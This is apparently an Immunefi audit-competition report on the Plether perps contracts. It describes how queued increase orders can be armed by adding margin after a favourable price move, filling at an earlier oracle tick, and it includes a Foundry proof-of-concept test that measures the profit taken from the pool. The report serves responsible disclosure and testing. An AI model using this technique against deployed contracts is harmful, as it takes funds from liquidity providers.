# \#99378 [SC-Low] Queued increases can be enabled after a price move, giving traders a free option

**Submitted on Nov 13th 2026 at 12:34:22 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99378
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A trader can commit an increase that is invalid under its own post-position equity bound, then add margin only if the market moves in its favour. The order still fills at the first Pyth tick after commitment, even if a newer mark is already installed. If the move is unfavourable, the trader can execute the invalid order itself: it fails, returns the committed margin and bounty, and leaves the position unchanged. A skew-reducing open has a second switch: withdrawing and redepositing free settlement changes whether its VPI rebate reserve can be funded.

## Vulnerability Details
`OrderLiquidationBatchLogic._commitOrder` checks the open planner but does not require `minPostPositionEquityAssets` or `maxPostLeverageBps` to pass at commitment. `CfdOrderPolicyEvaluatorBase` checks those bounds against the live position at execution. The account can change that position through `CfdEngine.addMargin` while the order waits. An increase can therefore be dead by default and armed after the trader sees a later price.

For skew-reducing opens, `CfdEnginePlanLib._planOpenReserveFunding` uses pre-existing free settlement before new pledge to fund the VPI rebate reserve. A flat account with no declared settlement floor can withdraw that free balance after commit. At the minimum accepted margin, the same order then fails planning; depositing the balance again restores it.

Both failures are terminal (`ConstraintViolation` or `PlannerRejected`). Router cleanup releases the order margin. When the account executes its own failed order, `OrderRouter._settleTerminalBounty` releases the bounty back to it as well. An outside keeper can instead terminalize the dead order and take the capped 0.20 USDG bounty.

SC-M4 in the published pre-audit report described a free option through LP depth manipulation and was marked fixed. This path uses account-controlled margin and settlement after commitment. It violates the stated binding-order property despite the earlier fix.


## Impact Details
The attached test starts with a 10,000 USDG LONG, then commits a dead-by-default 100,000 USDG LONG increase. After the basket moves 20 bps in the LONG's favour, the trader adds 100 USDG of margin, fills the increase at the earlier 1.00 tick, and closes at 0.998. Against a control that closes only the original position at the same market price, the selective fill adds **120.056024 USDG** to the trader and removes **194.001199 USDG** more pool cash. When the basket instead moves 20 bps against the LONG, self-executing the failed order changes neither the trader's USDG balance nor pool cash.

The attack requires the order to remain unexecuted until the trader chooses a branch and a market move large enough to cover trading fees. It does not require oracle manipulation or a privileged role. The PoC establishes a profitable extraction at 100,000 USDG order size; the larger figures in the original notes are not independently verified here.



## Proof of Concept

## Proof of Concept

Attach the single file [`QueuedOpenFreeOption.t.sol`](../../../packages/perps/test/poc/QueuedOpenFreeOption.t.sol). It uses the public V3 `commitOrder` and `executeOrder` methods with the release risk parameters. The repository test fixture uses a two-feed mock basket; only Pyth and USDG are mocked, and no contract under `src/` is changed.

```sh
forge test --root packages/perps --offline --match-path 'test/poc/QueuedOpenFreeOption.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Focused reproduction of an account-controlled execution-time equity bound.
contract QueuedOpenFreeOptionValidation is BasePerpTest {

    address internal constant TRADER = address(0xA11CE);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(TRADER, 10_000e6);
    }

    function test_QueuedIncreaseCanBeArmedByAddingMarginAfterCommit() public {
        _executeOpen(10_000e18, 1000e6);

        ICfdEngineTypes.OpenPreview memory preview =
            engineLens.previewOpen(TRADER, CfdTypes.Side.LONG, 100_000e18, 2000e6, 1e8);
        assertTrue(preview.valid);
        assertGt(preview.postEquityAssets, 0);

        OrderV3Types.OrderRequest memory request = _request(100_000e18, 2000e6);
        request.bounds.minPostPositionEquityAssets = uint256(preview.postEquityAssets) + 50e6;
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        uint256 balanceBefore = clearinghouse.balanceAssets(TRADER);
        uint256 snapshot = vm.snapshotState();

        // The account executes its own unarmed order and recovers both margin and bounty.
        bytes[] memory failedTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(id, failedTick);
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(clearinghouse.balanceAssets(TRADER), balanceBefore);
        (uint256 sizeBefore,,,,,,) = engine.positions(TRADER);
        assertEq(sizeBefore, 10_000e18);

        assertTrue(vm.revertToState(snapshot));
        vm.prank(TRADER);
        engine.addMargin(TRADER, 100e6);
        bytes[] memory executedTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory executed = router.executeOrder(id, executedTick);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 sizeAfter,,,,,,) = engine.positions(TRADER);
        assertEq(sizeAfter, 110_000e18);
    }

    function test_DeadByDefaultIncreaseCanTakeOldTickAfterFavorableMove() public {
        _executeOpen(10_000e18, 1000e6);
        ICfdEngineTypes.OpenPreview memory preview =
            engineLens.previewOpen(TRADER, CfdTypes.Side.LONG, 100_000e18, 2000e6, 1e8);
        assertTrue(preview.valid);

        OrderV3Types.OrderRequest memory request = _request(100_000e18, 2000e6);
        request.bounds.minPostPositionEquityAssets = uint256(preview.postEquityAssets) + 50e6;
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        uint256 wealthBefore = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
        uint256 poolBefore = pool.totalAssets();
        uint256 snapshot = vm.snapshotState();

        _updateCurrentMark(100_200_000);
        bytes[] memory oldTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory discarded = router.executeOrder(id, oldTick);
        assertEq(uint8(discarded.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(discarded.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER), wealthBefore);
        assertEq(pool.totalAssets(), poolBefore);

        assertTrue(vm.revertToState(snapshot));
        uint256 controlWealth;
        uint256 controlPool;
        {
            _updateCurrentMark(99_800_000);
            bytes[] memory controlOldTick = _mockPythUpdateData(1e8);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory controlFailure = router.executeOrder(id, controlOldTick);
            assertEq(uint8(controlFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
            OrderV3Types.OrderRequest memory controlClose = _request(10_000e18, 0);
            controlClose.isClose = true;
            controlClose.targetPrice = type(uint256).max;
            vm.prank(TRADER);
            uint64 controlCloseId = router.commitOrder(controlClose);
            bytes[] memory controlCloseTick = _mockPythUpdateData(99_800_000);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory controlResult = router.executeOrder(controlCloseId, controlCloseTick);
            assertEq(uint8(controlResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
            controlWealth = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
            controlPool = pool.totalAssets();
        }

        assertTrue(vm.revertToState(snapshot));
        _updateCurrentMark(99_800_000);
        vm.prank(TRADER);
        engine.addMargin(TRADER, 100e6);
        oldTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory filled = router.executeOrder(id, oldTick);
        assertEq(uint8(filled.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(engine.lastMarkPrice(), 99_800_000);
        (,, uint256 entryPrice,,,,) = engine.positions(TRADER);
        assertEq(entryPrice, 1e8, "queued increase fills at the earlier tick");

        OrderV3Types.OrderRequest memory closeRequest = _request(110_000e18, 0);
        closeRequest.isClose = true;
        closeRequest.targetPrice = type(uint256).max;
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(closeRequest);
        bytes[] memory currentTick = _mockPythUpdateData(99_800_000);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory closeResult = router.executeOrder(closeId, currentTick);
        assertEq(uint8(closeResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 wealthAfter = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
        uint256 poolAfter = pool.totalAssets();
        assertGt(wealthAfter, wealthBefore);
        assertLt(poolAfter, poolBefore);
        assertGt(wealthAfter, controlWealth, "selective fill beats closing the original position alone");
        assertLt(poolAfter, controlPool, "selective fill extracts additional pool cash");
        emit log_named_decimal_uint("trader gain USDG", wealthAfter - wealthBefore, 6);
        emit log_named_decimal_uint("pool cash loss USDG", poolBefore - poolAfter, 6);
        emit log_named_decimal_uint("incremental trader gain USDG", wealthAfter - controlWealth, 6);
        emit log_named_decimal_uint("incremental pool cash loss USDG", controlPool - poolAfter, 6);
    }

    function _updateCurrentMark(
        uint256 price
    ) private {
        vm.warp(block.timestamp + 5);
        vm.roll(block.number + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, block.timestamp);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(price);
        router.updateMarkPrice(data);
        assertEq(engine.lastMarkPrice(), price);
    }

    function _executeOpen(
        uint256 size,
        uint256 margin
    ) private {
        OrderV3Types.OrderRequest memory request = _request(size, margin);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        bytes[] memory tick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, tick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _request(
        uint256 size,
        uint256 margin
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = 1;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}

/// @notice Focused reproduction of post-commit withdrawal changing VPI reserve funding.
contract QueuedOpenRebateToggleValidation is BasePerpTest {

    address internal constant HEAVY_LONG = address(0xA11CE);
    address internal constant TRADER = address(0xB0B);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(HEAVY_LONG, 50_000e6);
        _fundTrader(TRADER, 10_000e6);
        _executeOpen(HEAVY_LONG, CfdTypes.Side.LONG, 2_000_000e18, 30_000e6);
    }

    function test_WithdrawAndRedepositToggleSkewReducingOpen() public {
        uint256 margin = _minimumValidMargin();
        ICfdEngineTypes.OpenPreview memory preview =
            engineLens.previewOpen(TRADER, CfdTypes.Side.SHORT, 1_000_000e18, margin, 1e8);
        assertTrue(preview.valid);
        assertLt(preview.vpiAssets, 0);

        OrderV3Types.OrderRequest memory request = _request(CfdTypes.Side.SHORT, 1_000_000e18, margin);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(TRADER);
        uint256 wealthBefore = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
        assertGt(free, 0);
        uint256 snapshot = vm.snapshotState();

        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, free);
        bytes[] memory deadTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(id, deadTick);
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected));
        assertEq(clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER), wealthBefore);

        assertTrue(vm.revertToState(snapshot));
        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, free);
        vm.startPrank(TRADER);
        settlementToken.approve(address(clearinghouse), free);
        clearinghouse.deposit(TRADER, free);
        vm.stopPrank();
        bytes[] memory liveTick = _mockPythUpdateData(1e8);
        vm.prank(TRADER);
        OrderV3Types.ExecutionResult memory executed = router.executeOrder(id, liveTick);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 1_000_000e18);
    }

    function _minimumValidMargin() private view returns (uint256 margin) {
        uint256 low = 1;
        uint256 high = 10_000e6;
        while (low < high) {
            uint256 mid = (low + high) / 2;
            bool valid = engineLens.previewOpen(TRADER, CfdTypes.Side.SHORT, 1_000_000e18, mid, 1e8).valid;
            if (valid) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        margin = low;
    }

    function _executeOpen(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) private {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin);
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        bytes[] memory tick = _mockPythUpdateData(1e8);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, tick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : type(uint256).max;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}
```
